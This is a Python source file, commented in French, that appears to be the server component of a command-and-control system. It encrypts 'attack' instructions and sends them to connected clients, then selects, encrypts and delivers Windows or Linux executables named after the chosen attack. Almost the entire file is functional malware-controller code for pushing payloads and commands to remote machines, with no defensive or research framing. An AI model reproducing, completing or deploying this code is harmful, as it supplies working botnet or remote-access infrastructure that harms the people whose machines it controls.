import json
import argparse
import os
import mysql.connector
import json
import socket
import select
import threading
import rsa
import base64

from env import *
from database import *
from network import *
from functions import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from queue import Queue, Empty


def format_attack_data(type, id, data):

    json_data = json.loads('{"id":"'+str(id)+'","attack":"'+type+'"}')


    print("\t\t(+) data : " + str(data))
    json_data.update(data)

    print("\t\t(+) data formed as json")

    return json_data




def send_executable_to_client(attack_type, client_os, client_sym_key, client_iv, client_reception_queue, client_emission_queue):
    #Récupérer os du client 
    if client_os == "windows":
        executable_path = 'actions/windows/' + attack_type + '.exe'
    else:
        executable_path = 'actions/linux/' + attack_type

    if os.path.isfile(executable_path):
        with open(executable_path, 'rb') as f:
            executable_data = f.read()
        
        # Chiffrer l'exécutable
        cipher = AES.new(client_sym_key, AES.MODE_CBC, iv=client_iv)
        file_encrypted = cipher.encrypt(pad(executable_data, AES.block_size))


        # Envois de la taille
        len_file_encrypted = len(file_encrypted)
        print("\t[+] Envoi de la taille de l'executable :", len_file_encrypted)

        cipher_file_size = AES.new(client_sym_key, AES.MODE_CBC, iv=client_iv)
        file_size_encrypted = cipher_file_size.encrypt(pad(str(len_file_encrypted).encode(), AES.block_size))
        client_emission_queue.put(file_size_encrypted)


        # Réception de la taille de l'éxécutable reçu par le client
        encrypted_data_received = client_reception_queue.get(timeout=3)
        
        cipher_len_buffer= AES.new(client_sym_key, AES.MODE_CBC, iv=client_iv)
        decrypt_size = unpad(cipher_len_buffer.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')

        print("\t[+] Reception de la taille :", decrypt_size)

        # Compare si la taille de l'éxécutable envoyé à bien était reçu par le client
        if int(len_file_encrypted) == int(decrypt_size) :

            #Envoi du fichier
            client_emission_queue.put(file_encrypted)
            # print(file_encrypted)
            # print(decrypt_size)
            print("\t[+] L'exécutable a été envoyé")

        else:
            print("\t[!] Les tailles ne correspondent pas.")
                        
    else:
        print("\t[!] L'exécutable n'a pas été trouvé sur le serveur")



def execute_attack(client, attack):
    print("\t[+] sending attack to " + str(client['addr']))

    # Récupération des données de l'attaque
    print("\t[+] data de l'attack : " + str(attack))
    print(type(attack[4]))
    attack_data = json.loads(attack[4])
    attack_type = attack[2]
    attack_id = attack[0]

    data_to_send = format_attack_data(attack_type, attack_id, attack_data)

    # Envoi de l'attaque à l'ordinateur
    cipher_enc = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
    cipher_text = cipher_enc.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))

    client['emission_queue'].put(cipher_text)

    print("\t[+] instruction envoyée")

    #### fin

    # reception du message retourner par le client 
    

    
    # Recevoir le status final de l'envoi de l'exécutable
    # encrypted_final_status = client['reception_queue'].get()
    # final_status = unpad(cipher.decrypt(encrypted_final_status), AES.block_size).decode('utf-8')
    # print(f"Statu final de l'attaque sur le client {client['addr']}: {final_status}")